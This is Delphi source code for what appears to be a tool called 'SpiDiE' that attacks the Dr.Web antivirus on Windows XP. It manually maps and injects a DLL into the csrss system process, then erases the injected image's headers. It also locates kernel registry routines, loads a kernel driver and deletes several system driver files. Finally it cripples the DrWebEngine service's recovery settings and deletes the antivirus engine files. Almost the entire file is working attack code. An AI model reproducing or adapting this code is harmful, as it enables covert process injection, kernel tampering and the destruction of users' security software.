    $EF, $31, $FD, $31, $25, $32, $51, $32, $57, $32, $C8, $32, $CD, $32, $1A, $33,
    $00, $20, $00, $00, $10, $00, $00, $00, $F4, $30, $F8, $30, $0C, $31, $10, $31,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00
    );

  cm2600_7600: array[0..6] of BYTE = ($C7, $45, $B4, $3F, $00, $0F, $00); //C7 45 B4 3F 00 0F 00

type
  TDllEntryProc = function(hinstDLL: HMODULE; dwReason: dword;
    lpvReserved: pointer): boolean; stdcall;

  TSections = array[0..0] of TImageSectionHeader;

  PLibInfo = ^TLibInfo;
  TLibInfo = packed record
    ImageBase: pointer;
    ImageSize: longint;
    DllProc: TDllEntryProc;
    DllProcAddress: pointer;
  end;

  PImageBaseRelocation = ^TImageBaseRelocation;
  TImageBaseRelocation = packed record
    VirtualAddress: dword;
    SizeOfBlock: dword;
  end;

  PImageImportDescriptor = ^TImageImportDescriptor;
  TImageImportDescriptor = packed record
    OriginalFirstThunk: dword;
    TimeDateStamp: dword;
    ForwarderChain: dword;
    Name: dword;
    FirstThunk: dword;
  end;

function GetSectionProtection(ImageScn: dword): dword;
begin
  Result := 0;
  if (ImageScn and IMAGE_SCN_MEM_NOT_CACHED) <> 0 then
    Result := Result or PAGE_NOCACHE;
  if (ImageScn and IMAGE_SCN_MEM_EXECUTE) <> 0 then
  begin
    if (ImageScn and IMAGE_SCN_MEM_READ) <> 0 then
    begin
      if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
        Result := Result or PAGE_EXECUTE_READWRITE
      else Result := Result or PAGE_EXECUTE_READ;

    end
    else if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
      Result := Result or PAGE_EXECUTE_WRITECOPY
    else Result := Result or PAGE_EXECUTE;

  end
  else if (ImageScn and IMAGE_SCN_MEM_READ) <> 0 then
  begin
    if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
      Result := Result or PAGE_READWRITE
    else Result := Result or PAGE_READONLY;

  end
  else if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
    Result := Result or PAGE_WRITECOPY
  else Result := Result or PAGE_NOACCESS;
end;

function InjectMemory(Process: dword; Memory: pointer; Size: dword): pointer;
var
  BytesWritten: dword;
begin
  result := nil;
  ZwAllocateVirtualMemory(Process, @result, 0, @Size, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (result <> nil) then
    ZwWriteVirtualMemory(Process, Result, Memory, Size, @BytesWritten);
end;

function InjectThread(Process: dword; Thread: pointer; Info: pointer;
  InfoLen: dword; Results: boolean): THandle;
var
  pThread, pInfo: pointer;
  BytesRead, TID: dword;
begin
  pInfo := InjectMemory(Process, Info, InfoLen);
  pThread := InjectMemory(Process, Thread, SizeOfProc(Thread));
  Result := CreateRemoteThread(Process, nil, 0, pThread, pInfo, 0, TID);
  if Results then
  begin
    ZwWaitForSingleObject(Result, false, nil);
    ZwReadVirtualMemory(Process, pInfo, Info, InfoLen, @BytesRead);
  end;
end;

function InjectString(Process: dword; Text: PChar): PChar;
var
  BytesWritten: dword;
  Size: DWORD;
begin
  result := nil;
  Size := strlenA(Text) + 1;
  BytesWritten := Size;
  ZwAllocateVirtualMemory(Process, @result, 0, @BytesWritten, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (result <> nil) then
    ZwWriteVirtualMemory(Process, Result, Text, Size, @BytesWritten);
end;

function GetProcAddressEx(Process: dword; lpModuleName,
  lpProcName: pchar; dwProcLen: dword): pointer;
type
  TGetProcAddrExInfo = record
    pExitThread: pointer;
    pGetProcAddress: pointer;
    pGetModuleHandle: pointer;
    lpModuleName: pointer;
    lpProcName: pointer;
  end;
var
  GetProcAddrExInfo: TGetProcAddrExInfo;
  BasicInformation: THREAD_BASIC_INFORMATION;
  hThread: dword;

  procedure GetProcAddrExThread(lpParameter: pointer); stdcall;
  var
    GetProcAddrExInfo: TGetProcAddrExInfo;
  begin
    GetProcAddrExInfo := TGetProcAddrExInfo(lpParameter^);
    asm
      push GetProcAddrExInfo.lpModuleName
      call GetProcAddrExInfo.pGetModuleHandle
      push GetProcAddrExInfo.lpProcName
      push eax
      call GetProcAddrExInfo.pGetProcAddress
      push eax
      call GetProcAddrExInfo.pExitThread
    end;
  end;

begin
  Result := nil;
  GetProcAddrExInfo.pGetModuleHandle := GetProcAddress(GetModuleHandleW(kernel32), 'GetModuleHandleA');
  GetProcAddrExInfo.pGetProcAddress := GetProcAddress(GetModuleHandleW(kernel32), 'GetProcAddress');
  GetProcAddrExInfo.pExitThread := GetProcAddress(GetModuleHandleW(kernel32), 'ExitThread');
  if dwProcLen = 4 then GetProcAddrExInfo.lpProcName := lpProcName else
    GetProcAddrExInfo.lpProcName := InjectMemory(Process, lpProcName, dwProcLen);

  GetProcAddrExInfo.lpModuleName := InjectString(Process, lpModuleName);
  hThread := InjectThread(Process, @GetProcAddrExThread, @GetProcAddrExInfo,
    SizeOf(GetProcAddrExInfo), False);

  if hThread <> 0 then
  begin
    ZwWaitForSingleObject(hThread, false, nil);
    memzero(@BasicInformation, sizeof(BasicInformation));
    ZwQueryInformationThread(hThread, ThreadBasicInformation, @BasicInformation, sizeof(BasicInformation), nil);
    result := pointer(BasicInformation.ExitStatus);
  end;
end;

function MapLibrary(Process: dword; Dest, Src: pointer): TLibInfo;
var
  ImageBase: pointer;
  ImageBaseDelta: integer;
  ImageNtHeaders: PImageNtHeaders;
  PSections: ^TSections;
  SectionLoop: integer;
  SectionBase: pointer;
  VirtualSectionSize, RawSectionSize: dword;
  OldProtect: dword;
  bytesIO: DWORD;
  Addr: PChar;
  NewLibInfo: TLibInfo;

  procedure ProcessRelocs(PRelocs: PImageBaseRelocation);
  var
    PReloc: PImageBaseRelocation;
    RelocsSize: dword;
    Reloc: PWord;
    ModCount: dword;
    RelocLoop: dword;
  begin
    PReloc := PRelocs;
    RelocsSize := ImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    while dword(PReloc) - dword(PRelocs) < RelocsSize do
    begin
      ModCount := (PReloc.SizeOfBlock - Sizeof(PReloc^)) div 2;
      Reloc := pointer(dword(PReloc) + sizeof(PReloc^));
      for RelocLoop := 0 to ModCount - 1 do
      begin
        if Reloc^ and $F000 <> 0 then Inc(pdword(dword(ImageBase) +
            PReloc.VirtualAddress +
            (Reloc^ and $0FFF))^, ImageBaseDelta);
        Inc(Reloc);
      end;
      PReloc := pointer(Reloc);
    end;
  end;

  procedure ProcessImports(PImports: PImageImportDescriptor);
  var
    PImport: PImageImportDescriptor;
    Import: pdword;
    PImportedName: pchar;
    ProcAddress: pointer;
    PLibName: pchar;

    function IsImportByOrdinal(ImportDescriptor: dword): boolean;
    begin
      Result := (ImportDescriptor and IMAGE_ORDINAL_FLAG32) <> 0;
    end;

  begin
    PImport := PImports;
    while PImport.Name <> 0 do
    begin
      PLibName := pchar(dword(PImport.Name) + dword(ImageBase));

      if PImport.TimeDateStamp = 0 then
        Import := pdword(pImport.FirstThunk + dword(ImageBase))
      else
        Import := pdword(pImport.OriginalFirstThunk + dword(ImageBase));

      while Import^ <> 0 do
      begin
        if IsImportByOrdinal(Import^) then
          ProcAddress := GetProcAddressEx(Process, PLibName, PChar(Import^ and $FFFF), 4)
        else
        begin
          PImportedName := pchar(Import^ + dword(ImageBase) + IMPORTED_NAME_OFFSET);
          ProcAddress := GetProcAddressEx(Process, PLibName, PImportedName, strlenA(PImportedName));
        end;
        Ppointer(Import)^ := ProcAddress;
        Inc(Import);
      end;
      Inc(PImport);
    end;
  end;

begin
  ImageNtHeaders := pointer(dword(Src) + dword(PImageDosHeader(Src)._lfanew));

  bytesIO := ImageNtHeaders.OptionalHeader.SizeOfImage;
  ImageBase := Dest;
  ZwAllocateVirtualMemory(NtCurrentProcess, @ImageBase, 0, @bytesIO, MEM_RESERVE, PAGE_NOACCESS);

  ImageBaseDelta := dword(ImageBase) - ImageNtHeaders.OptionalHeader.ImageBase;

  bytesIO := ImageNtHeaders.OptionalHeader.SizeOfHeaders;
  SectionBase := ImageBase;
  ZwAllocateVirtualMemory(NtCurrentProcess, @SectionBase, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);

  memcopy(SectionBase, Src, ImageNtHeaders.OptionalHeader.SizeOfHeaders);

  bytesIO := ImageNtHeaders.OptionalHeader.SizeOfHeaders;
  ZwProtectVirtualMemory(NtCurrentProcess, @SectionBase, @bytesIO, PAGE_READONLY, @OldProtect);

  PSections := pointer(pchar(@(ImageNtHeaders.OptionalHeader)) +
    ImageNtHeaders.FileHeader.SizeOfOptionalHeader);

  for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do
  begin
    VirtualSectionSize := PSections[SectionLoop].Misc.VirtualSize;
    RawSectionSize := PSections[SectionLoop].SizeOfRawData;
    if VirtualSectionSize < RawSectionSize then
    begin
      VirtualSectionSize := VirtualSectionSize xor RawSectionSize;
      RawSectionSize := VirtualSectionSize xor RawSectionSize;
      VirtualSectionSize := VirtualSectionSize xor RawSectionSize;
    end;

    SectionBase := PSections[SectionLoop].VirtualAddress + pchar(ImageBase);
    bytesIO := VirtualSectionSize;
    ZwAllocateVirtualMemory(NtCurrentProcess, @SectionBase, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);

    memzero(SectionBase, VirtualSectionSize);
    memcopy(SectionBase, (pchar(src) + PSections[SectionLoop].pointerToRawData), RawSectionSize);
  end;

  NewLibInfo.DllProcAddress := pointer(ImageNtHeaders.OptionalHeader.AddressOfEntryPoint +
    dword(ImageBase));
  NewLibInfo.DllProc := TDllEntryProc(NewLibInfo.DllProcAddress);

  NewLibInfo.ImageBase := ImageBase;
  NewLibInfo.ImageSize := ImageNtHeaders.OptionalHeader.SizeOfImage;

  if ImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress <> 0
    then ProcessRelocs(pointer(ImageNtHeaders.OptionalHeader.
      DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].
      VirtualAddress + dword(ImageBase)));

  if ImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress <> 0
    then ProcessImports(pointer(ImageNtHeaders.OptionalHeader.
      DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].
      VirtualAddress + dword(ImageBase)));

  for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do
  begin
    bytesIO := PSections[SectionLoop].Misc.VirtualSize;
    Addr := PSections[SectionLoop].VirtualAddress + pchar(ImageBase);
    ZwProtectVirtualMemory(NtCurrentProcess, @Addr,
      @bytesIO, GetSectionProtection(PSections[SectionLoop].Characteristics), @OldProtect);
  end;
  Result := NewLibInfo;
end;

function memopen(Process: THANDLE; p: pointer; OldProtect: DWORD): BOOLEAN;
var
  bytesIO: DWORD;
  buf: pointer;
begin
  bytesIO := 4096;
  buf := p;
  result := (ZwProtectVirtualMemory(Process, @buf, @bytesIO, PAGE_EXECUTE_READWRITE, @OldProtect) = STATUS_SUCCESS);
end;

function memclose(Process: THANDLE; p: pointer; OldProtect: DWORD): BOOLEAN;
var
  pr, bytesIO: DWORD;
  buf: pointer;
begin
  bytesIO := 4096;
  buf := p;
  result := (ZwProtectVirtualMemory(Process, @buf, @bytesIO, OldProtect, @pr) = STATUS_SUCCESS);
end;

function InjectDllEx(Process: dword; Src: pointer): boolean;
type
  TDllLoadInfo = packed record
    Module: pointer;
    EntryPoint: pointer;
  end;
var
  Lib: TLibInfo;
  ImageNtHeaders: PImageNtHeaders;
  pModule: pointer;
  OldProtect: DWORD;
  BytesWritten: DWORD;
  Offset: DWORD;
  hThread: DWORD;
  bytesIO: DWORD;
  DllLoadInfo: TDllLoadInfo;

  procedure DllEntryPoint(lpParameter: pointer); stdcall;
  var
    LoadInfo: TDllLoadInfo;
  begin
    LoadInfo := TDllLoadInfo(lpParameter^);
    asm
      xor eax, eax
      push eax
      push DLL_PROCESS_ATTACH
      push LoadInfo.Module
      call LoadInfo.EntryPoint
    end;
  end;

begin
  Result := False;
  ImageNtHeaders := pointer(dword(Src) + dword(PImageDosHeader(Src)._lfanew));
  Offset := $10000000;
  repeat
    Inc(Offset, $10000);

    pModule := pointer(ImageNtHeaders.OptionalHeader.ImageBase + Offset);
    bytesIO := ImageNtHeaders.OptionalHeader.SizeOfImage;
    ZwAllocateVirtualMemory(NtCurrentProcess, @pModule, 0, @bytesIO, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (pModule <> nil) then
    begin
      bytesIO := 0;
      ZwFreeVirtualMemory(NtCurrentProcess, @pModule, @bytesIO, MEM_RELEASE);

      bytesIO := ImageNtHeaders.OptionalHeader.SizeOfImage;
      pModule := pointer(ImageNtHeaders.OptionalHeader.ImageBase + Offset);
      ZwAllocateVirtualMemory(Process, @pModule, 0, @bytesIO, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    end;
  until ((pModule <> nil) or (Offset > $30000000));
  Lib := MapLibrary(Process, pModule, Src);
  if Lib.ImageBase = nil then Exit;
  DllLoadInfo.Module := Lib.ImageBase;
  DllLoadInfo.EntryPoint := Lib.DllProcAddress;

  ZwWriteVirtualMemory(Process, pModule, Lib.ImageBase, Lib.ImageSize, @BytesWritten);

  hThread := InjectThread(Process, @DllEntryPoint, @DllLoadInfo,
    SizeOf(TDllLoadInfo), False);
  Result := (hThread <> 0);
  OldProtect := 0;
  if (Result) then
    if (memopen(Process, pModule, OldProtect)) then
    begin
      bytesIO := 512;
      memfill(@tmp2, sizeof(tmp2), $F);
      ZwWriteVirtualMemory(Process, pModule, @tmp2, bytesIO, @BytesWritten);
      memclose(Process, pModule, OldProtect);
    end;
end;

function ShowMessage(PStr: PWideChar; Buttons: DWORD): DWORD;
begin
  result := MessageBoxW(GetDesktopWindow(), PStr, SpiDiEMsg, Buttons);
end;

function GetTargetProcessHandle(): THANDLE;
var
  attr: OBJECT_ATTRIBUTES;
  cid1: CLIENT_ID;
begin
  result := 0;
  cid1.UniqueProcess := CsrGetProcessId();
  cid1.UniqueThread := 0;
  InitializeObjectAttributes(@attr, nil, 0, 0, nil);
  if (ZwOpenProcess(@result, PROCESS_ALL_ACCESS, @attr, @cid1) <> STATUS_SUCCESS) then result := 0;
end;

procedure GetDrWebDir(Mode: DWORD);
var
  f: THANDLE;
begin
  strcpyW(tmp2, DwprotPath);
  uitoW(Mode, strendW(tmp2));
  f := Internal_RegOpenKey(tmp2, 0, KEY_QUERY_VALUE);
  if (f <> 0) then
  begin
    memzero(@DrWebDir, sizeof(LBuf));
    strcpynW(DrWebDir, KI_SHARED_USER_DATA.NtSystemRoot, 2);
    Internal_RegReadString(f, 'Name', strendW(DrWebDir));
    ZwClose(f);
  end;
end;

procedure DelFiles(const lpDir: PWideChar);
var
  MemSize: DWORD;
  fh: THANDLE;
  ns: NTSTATUS;
  Event: THANDLE;
  DirInformation: PFILE_BOTH_DIR_INFORMATION;
  Buffer: pointer;
begin
  if (lpDir <> nil) then
  begin
    if (RtlDosPathNameToNtPathName_U(lpDir, @str1, nil, nil)) then
    begin
      InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
      ns := ZwCreateFile(@fh, GENERIC_READ or FILE_LIST_DIRECTORY, @attr, @iost, nil,
        FILE_ATTRIBUTE_DIRECTORY,
        FILE_SHARE_READ or FILE_SHARE_WRITE or FILE_SHARE_DELETE,
        FILE_OPEN, FILE_DIRECTORY_FILE, nil, 0);
      if (ns = STATUS_SUCCESS) then
      begin
        MemSize := $100000;

        Buffer := RtlAllocateHeap(RtlGetProcessHeap(), HEAP_ZERO_MEMORY, MemSize);
        if (Buffer <> nil) then
        begin
          Event := 0;
          ZwCreateEvent(@Event, GENERIC_ALL, nil, NotificationEvent, false);
          ns := ZwQueryDirectoryFile(fh, Event, nil, nil, @iost, Buffer, MemSize,
            FileBothDirectoryInformation, false, nil, FALSE);
          if (ns = STATUS_PENDING) then ZwWaitForSingleObject(Event, true, nil);
          DirInformation := Buffer;
          if (DirInformation <> nil) then
            while (1 = 1) do
            begin
              strcpyW(FileBuffer, lpDir);
              strcatW(FileBuffer, '\');
              strcpynW(strendW(FileBuffer), @DirInformation^.FileName[0], DirInformation^.FileNameLength div sizeof(WCHAR));
              Internal_RemoveFile(FileBuffer);
              if (DirInformation^.NextEntryOffset = 0) then break else
                DirInformation := PFILE_BOTH_DIR_INFORMATION(PChar(DirInformation) + DirInformation^.NextEntryOffset);
            end;
          if (Event <> 0) then ZwClose(Event);
          RtlFreeHeap(RtlGetProcessHeap(), 0, Buffer);
        end;
        ZwClose(fh);
      end;
    end;
  end;
end;

procedure DisableDwEngine();
var
  hscm, hsrv: SC_HANDLE;
  Actions: SERVICE_FAILURE_ACTIONSW;
  Action: SC_ACTION;
begin
  hscm := OpenSCManagerW(nil, nil, SC_MANAGER_ALL_ACCESS);
  if (hscm <> 0) then
  begin
    strcpyW(tmp2, 'DrWebEngine');
    hsrv := OpenServiceW(hscm, tmp2, SERVICE_ALL_ACCESS);
    if (hsrv <> 0) then
    begin
      Actions.dwResetPeriod := 100;
      Actions.lpRebootMsg := nil;
      Actions.lpCommand := nil;
      Actions.cActions := 1;
      Actions.lpsaActions := @Action;
      Action._Type := SC_ACTION_NONE;
      Action.Delay := 0;
      ChangeServiceConfig2W(hsrv, SERVICE_CONFIG_FAILURE_ACTIONS, @Actions);
      CloseServiceHandle(hsrv);
    end;
    CloseServiceHandle(hscm);
  end;
end;

procedure KillDrWebFiles(Mode: BYTE);
begin
  if (Mode = 1) then
  begin
    GetDrWebDir(2);
    if (DrWebDir[0] <> #0) then
    begin
      strcatW(DrWebDir, ScanningEngine);
      DelFiles(DrwebDir);
    end;

    GetDrWebDir(2);
    if (DrWebDir[0] <> #0) then
    begin
      strcatW(DrWebDir, '\Doctor Web');
      strcatW(DrWebDir, ScanningEngine);
      DelFiles(DrwebDir);
    end;

  end else
  begin
    GetDrWebDir(0);
    if (DrWebDir[0] <> #0) then
    begin
      DelFiles(DrwebDir);
      strcpyW(tmp2, DrWebDir);
      strcatW(tmp2, '\Danil0ff');
      memzero(@DrWebDir, sizeof(LBuf));
      DrWebDir[0] := WCHAR($FEFF);
      strcpyW(@DrWebDir[1], 'By buying Dr.Web you are supporting communism');
      Internal_WriteBufferToFile(tmp2, @DrWebDir, (strlenW(DrWebDir) * sizeof(WCHAR)) + 2);
    end;
  end;
end;

procedure GetCmKeyObjectInitializer(pObjectBody: POBJECT_TYPE_INITIALIZER; const KernelBaseAddress: DWORD); stdcall;
var
  RawSize, x, y: DWORD;
  RawData, p1: PChar;
  i, Length: integer;
  u: integer;
  bFound: boolean;

  function CheckSignature(var signsize: dword): BOOLEAN;
  var
    c: integer;
  begin
    result := true;
    signsize := 7;
    for c := 0 to 6 do
      if (cm2600_7600[c] <> PBYTE(RawData + c)^) then
      begin
        result := false;
        break;
      end;
  end;

begin
  p1 := preloaded_kernel;
  dos_header := pointer(p1);
  pe_headers := pointer(p1 + dos_header^._lfanew);

  bFound := false;
  for u := 0 to pe_headers^.FileHeader.NumberOfSections - 1 do
  begin
    if bFound then break;
    RawData := pointer(p1 + pe_headers^.Sections[u].PointerToRawData);
    RawSize := pe_headers^.Sections[u].SizeOfRawData - 12;
    x := 0;
    while (RawSize > 512) do
    begin
      if CheckSignature(x) then
      begin
        inc(RawData, x);
        dec(RawSize, x);
        Length := SizeOfProc(Pointer(RawData));

        for i := 0 to Length do
        begin
          if (PBYTE(RawData + i)^ = $C7)
            and (PBYTE(RawData + i + 1)^ = $45)
            and (PBYTE(RawData + i + 2)^ = $D0) then
          //mov [ebp+var_30],
          begin
            y := 3;
            x := PULONG(RawData + i + y)^;

            x := x - KernelBaseAddress;
            pObjectBody^.CloseProcedure := pointer(KernelBaseAddress + x); //CmpCloseKeyObject

            x := SizeOfCode(Pointer(RawData + i), nil);
            if (x = 0) then inc(x);
            inc(y, x);
            x := PULONG(RawData + i + y)^;
            x := x - KernelBaseAddress;
            pObjectBody^.DeleteProcedure := pointer(KernelBaseAddress + x); //CmpDeleteKeyObject

            x := SizeOfCode(Pointer(RawData + i), nil);
            if (x = 0) then inc(x);
            inc(y, x);
            x := PULONG(RawData + i + y)^;
            x := x - KernelBaseAddress;
            pObjectBody^.ParseProcedure := pointer(KernelBaseAddress + x); //CmpParseKey

            bFound := true;
            break;
          end;
        end;
        if bFound then break;
      end;
      inc(RawData);
      dec(RawSize);
    end;
  end;
end;

procedure GetOriginalSystemState(); stdcall;
var
  bytesIO: DWORD;
  buf1: LBuf;
begin
  bytesIO := 0;
  ZwQuerySystemInformation(SystemModuleInformation, @modinf, sizeof(SYSINFO_BUFFER), @bytesIO);
  if (bytesIO = 0) then exit;
  strcpyW(buf1, KI_SHARED_USER_DATA.NtSystemRoot);
  strcatW(buf1, '\system32\');
  RtlAnsiToUnicode(strendW(buf1), @modinf.ModInfo[0].ImageName[modinf.ModInfo[0].ModuleNameOffset]);

  preloaded_kernel := PELdrLoadLibrary(buf1, nil, modinf.ModInfo[0].Base);
  if (preloaded_kernel <> nil) then
  begin
    dos_header := pointer(preloaded_kernel);
    pe_headers := pointer(PCHAR(preloaded_kernel) + dos_header^._lfanew);
    KernelBaseAddress := (DWORD(modinf.ModInfo[0].Base) - pe_headers^.OptionalHeader.ImageBase);
    GetCmKeyObjectInitializer(@CmKeyType, KernelBaseAddress);
  end;
end;

function WriteDriverLoadSettings(
  RegPath: PWideChar
  ): boolean; stdcall;
var
  drvkey: THANDLE;
  dat1: DWORD;
begin
  result := false;
  RtlInitUnicodeString(@str1, RegPath);
  attr.Length := sizeof(OBJECT_ATTRIBUTES);
  attr.RootDirectory := 0;
  attr.ObjectName := @str1;
  attr.Attributes := OBJ_CASE_INSENSITIVE;
  attr.SecurityDescriptor := nil;
  attr.SecurityQualityOfService := nil;
  if (ZwCreateKey(@drvkey, KEY_ALL_ACCESS, @attr, 0,
    nil, REG_OPTION_NON_VOLATILE, nil) <> STATUS_SUCCESS) then exit;

  dat1 := SERVICE_ERROR_NORMAL;
  RtlInitUnicodeString(@str1, 'ErrorControl');
  ZwSetValueKey(drvkey, @str1, 0, REG_DWORD, @dat1, sizeof(DWORD));

  dat1 := SERVICE_DEMAND_START;
  RtlInitUnicodeString(@str1, 'Start');
  ZwSetValueKey(drvkey, @str1, 0, REG_DWORD, @dat1, sizeof(DWORD));

  dat1 := SERVICE_KERNEL_DRIVER;
  RtlInitUnicodeString(@str1, 'Type');
  ZwSetValueKey(drvkey, @str1, 0, REG_DWORD, @dat1, sizeof(DWORD));

  dat1 := ULONG(CmKeyType.ParseProcedure);
  RtlInitUnicodeString(@str1, 'Parse');
  ZwSetValueKey(drvkey, @str1, 0, REG_DWORD, @dat1, sizeof(DWORD));

  ZwClose(drvkey);

  result := true;
end;

function SpiDiE_LoadDriver(
  const RegistryPath: PWideChar
  ): BOOL; stdcall;
var
  s1: UNICODE_STRING;
  disp: DWORD;
begin
  result := false;
  if not WriteDriverLoadSettings(RegistryPath) then exit;
  RtlInitUnicodeString(@s1, RegistryPath);
  disp := ZwLoadDriver(@s1);
  result := (disp = STATUS_TOO_LATE);
end;

procedure SpiDiE_2();
var
  i: integer;
  buf1: LBuf;
begin
  memzero(@buf1, sizeof(LBuf));
  strcpyW(buf1, KI_SHARED_USER_DATA.NtSystemRoot);
  strcatW(buf1, spidiedriver);
  if (Internal_WriteBufferToFile(buf1, @driver_data, sizeof(driver_data)) = sizeof(driver_data)) then
  begin
    GetOriginalSystemState();

    if (SpiDiE_LoadDriver(RegPath)) then
    begin
      Internal_RemoveFile(buf1);

      for i := 0 to 3 do
      begin
        strcpyW(buf1, KI_SHARED_USER_DATA.NtSystemRoot);
        strcatW(buf1, '\system32\drivers\');
        strcatW(buf1, drivers[i]);
        Internal_RemoveFile(buf1);
      end;
    end
    else
    begin
      strcpyW(buf1, KI_SHARED_USER_DATA.NtSystemRoot);
      strcatW(buf1, spidiedriver);
      Internal_RemoveFile(buf1);
      NtSleep(2000);
    end;
  end;
end;

var
  i: integer;
  osver: OSVERSIONINFOEXW;
  hCsrss: THANDLE;
  EventHandle: THANDLE;
begin
  FileBuffer := RtlAllocateHeap(RtlGetProcessHeap(), HEAP_ZERO_MEMORY, MaxWord);
  if (FileBuffer = nil) then exit;

  osver.old.dwOSVersionInfoSize := sizeof(osver.old);
  RtlGetVersion(@osver);
  if (osver.old.dwBuildNumber <> 2600) then
  begin
    ShowMessage(String1, MB_ICONINFORMATION);
  end else
  begin
    if (ShowMessage(String4, MB_YESNO or MB_ICONQUESTION) = IDNO) then exit;

    if (Internal_AdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE) = STATUS_SUCCESS) then
    begin
      hCsrss := GetTargetProcessHandle();
      if (hCsrss <> 0) then
      begin
        EventHandle := 0;
        RtlInitUnicodeString(@str1, String6);
        InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
        ZwCreateEvent(@EventHandle, EVENT_ALL_ACCESS, @attr, NotificationEvent, FALSE);
        if (EventHandle = 0) then
        begin
          ZwOpenEvent(@EventHandle, EVENT_ALL_ACCESS, @attr);
        end;
        if (EventHandle <> 0) then
        begin
          if not InjectDllEx(hCsrss, @data) then OutputDebugStringW(String7) else
          begin
            if (ZwWaitForSingleObject(EventHandle, false, nil) = 0) then
            begin
              ShowMessage(String8, MB_ICONINFORMATION);

              if (Internal_AdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE) = STATUS_SUCCESS) then
              begin
                SpiDiE_2();
                Internal_RegDeleteKeyRecursive(0, RegPath);
                NtSleep(4000);
              end;
              DisableDwEngine();
              NtSleep(1000);
              KillDrWebFiles(0);
              for i := 0 to 2 do
              begin
                DisableDwEngine();
                KillDrWebFiles(0);
                NtSleep(500);
                KillDrWebFiles(1);
              end;
            end;
            ShowMessage(String9, MB_ICONINFORMATION);
          end;
          ZwClose(EventHandle);
        end;
      end;
    end;
  end;
  RtlFreeHeap(RtlGetProcessHeap(), 0, FileBuffer);
  ZwTerminateProcess(NtCurrentProcess, 0);
end.

